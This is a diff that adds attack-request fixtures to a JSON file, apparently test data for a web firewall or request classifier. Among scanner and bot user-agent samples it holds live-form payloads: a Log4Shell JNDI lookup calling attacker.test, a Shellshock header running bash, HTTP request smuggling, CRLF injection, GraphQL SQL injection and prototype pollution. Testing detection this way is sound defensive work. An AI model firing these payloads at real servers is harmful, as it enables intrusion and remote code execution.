@@ -97,6 +97,187 @@
       "method": "GET",
       "uri": "/.env",
       "headers": { "User-Agent": "Go-http-client/1.1" }
-    }
+    },
+{
+  "id": "scanner-acunetix-ua",
+  "category": "scanner",
+  "method": "GET",
+  "uri": "/",
+  "headers": { "User-Agent": "Acunetix/6.0" }
+},
+{
+  "id": "scanner-netsparker-ua",
+  "category": "scanner",
+  "method": "GET",
+  "uri": "/",
+  "headers": { "User-Agent": "Netsparker/4.2" }
+},
+{
+  "id": "scanner-burp-ua",
+  "category": "scanner",
+  "method": "GET",
+  "uri": "/",
+  "headers": { "User-Agent": "Mozilla/5.0 (compatible; BurpSuite/2024)" }
+},
+{
+  "id": "scanner-wpscan-ua",
+  "category": "scanner",
+  "method": "GET",
+  "uri": "/wp-admin/",
+  "headers": { "User-Agent": "wpscan/3.8.22" }
+},
+{
+  "id": "cve-tomcat-manager",
+  "category": "scanner",
+  "method": "GET",
+  "uri": "/manager/html",
+  "headers": { "User-Agent": "Mozilla/5.0" }
+},
+{
+  "id": "cve-log4shell-header",
+  "category": "scanner",
+  "method": "GET",
+  "uri": "/",
+  "headers": { "X-Api-Version": "${jndi:ldap://attacker.test/exploit}", "User-Agent": "Mozilla/5.0" }
+},
+{
+  "id": "cve-shellshock",
+  "category": "scanner",
+  "method": "GET",
+  "uri": "/cgi-bin/test",
+  "headers": { "User-Agent": "() { :; }; echo; /bin/bash -c 'id'" }
+},
+{
+  "id": "cve-struts2-ognl",
+  "category": "scanner",
+  "method": "POST",
+  "uri": "/struts2/action",
+  "headers": { "Content-Type": "%{ognl_expression}", "User-Agent": "Mozilla/5.0" },
+  "body": ""
+},
+
+{
+  "id": "protocol-clte-smuggling",
+  "category": "protocol",
+  "method": "POST",
+  "uri": "/api/order",
+  "headers": {
+    "Transfer-Encoding": "chunked",
+    "Content-Length": "50",
+    "User-Agent": "Mozilla/5.0"
+  },
+  "body": "0\r\n\r\nGET /admin HTTP/1.1\r\nHost: internal\r\n\r\n"
+},
+{
+  "id": "protocol-header-injection",
+  "category": "protocol",
+  "method": "GET",
+  "uri": "/search?q=test%0d%0aX-Forwarded-For:127.0.0.1",
+  "headers": { "User-Agent": "Mozilla/5.0" },
+  "args": { "q": ["test%0d%0aX-Forwarded-For:127.0.0.1"] }
+},
+{
+  "id": "protocol-invalid-method",
+  "category": "protocol",
+  "method": "FOOBAR",
+  "uri": "/",
+  "headers": { "User-Agent": "Mozilla/5.0" }
+},
+{
+  "id": "protocol-multiple-host",
+  "category": "protocol",
+  "method": "GET",
+  "uri": "/",
+  "headers": { "Host": "target.com, evil.com", "User-Agent": "Mozilla/5.0" }
+},
+
+{
+  "id": "api-graphql-sqli",
+  "category": "api",
+  "method": "POST",
+  "uri": "/graphql",
+  "headers": { "Content-Type": "application/json", "User-Agent": "Mozilla/5.0" },
+  "args": { "query": ["{user(id: \"1 or 1=1\") {name}}"] },
+  "body": "{\"query\":\"{user(id: \\\"1 or 1=1\\\") {name}}\"}"
+},
+{
+  "id": "api-graphql-depth-attack",
+  "category": "api",
+  "method": "POST",
+  "uri": "/graphql",
+  "headers": { "Content-Type": "application/json", "User-Agent": "Mozilla/5.0" },
+  "args": { "query": ["{a{b{c{d{e{f{g{h{i{j{k{l{m{n{o{p{q{r{s{t{u{v{w{x{y{z{}}}}}}}}}}}}}}}}}}}}}}}"] },
+  "body": "{\"query\":\"{a{b{c{d{e{f{g{h{i{j{k{l{m{n{o{p{q{r{s{t{u{v{w{x{y{z{}}}}}}}}}}}}}}}}}}}}}}}}\"}"
+},
+{
+  "id": "api-jwt-role-tamper",
+  "category": "api",
+  "method": "POST",
+  "uri": "/api/admin",
+  "headers": { "Content-Type": "application/json", "User-Agent": "Mozilla/5.0" },
+  "args": { "role": ["admin"] },
+  "body": "{\"role\":\"admin\"}"
+},
+{
+  "id": "api-json-prototype-pollution",
+  "category": "api",
+  "method": "POST",
+  "uri": "/api/settings",
+  "headers": { "Content-Type": "application/json", "User-Agent": "Mozilla/5.0" },
+  "args": { "__proto__": ["{\"admin\":true}"] },
+  "body": "{\"__proto__\":{\"admin\":true}}"
+},
+{
+  "id": "api-idor-user-id",
+  "category": "api",
+  "method": "GET",
+  "uri": "/api/user?user_id=999",
+  "headers": { "User-Agent": "Mozilla/5.0" },
+  "args": { "user_id": ["999"] }
+},
+
+{
+  "id": "bot-axios-ua",
+  "category": "bot",
+  "method": "GET",
+  "uri": "/",
+  "headers": { "User-Agent": "axios/1.6.0" }
+},
+{
+  "id": "bot-node-fetch-ua",
+  "category": "bot",
+  "method": "GET",
+  "uri": "/",
+  "headers": { "User-Agent": "node-fetch/2.6.1" }
+},
+{
+  "id": "bot-wget-ua",
+  "category": "bot",
+  "method": "GET",
+  "uri": "/download",
+  "headers": { "User-Agent": "Wget/1.20.3" }
+},
+{
+  "id": "bot-selenium-ua",
+  "category": "bot",
+  "method": "GET",
+  "uri": "/login",
+  "headers": { "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) Selenium" }
+},
+{
+  "id": "bot-scrapy-ua",
+  "category": "bot",
+  "method": "GET",
+  "uri": "/search",
+  "headers": { "User-Agent": "Scrapy/2.8.0" }
+},
+{
+  "id": "bot-php-serialize-probe",
+  "category": "bot",
+  "method": "GET",
+  "uri": "/?a=O:8:\"stdClass\":0:{}",
+  "headers": { "User-Agent": "Mozilla/5.0" },
+  "args": { "a": ["O:8:\"stdClass\":0:{}"] }
+}
   ]
 }
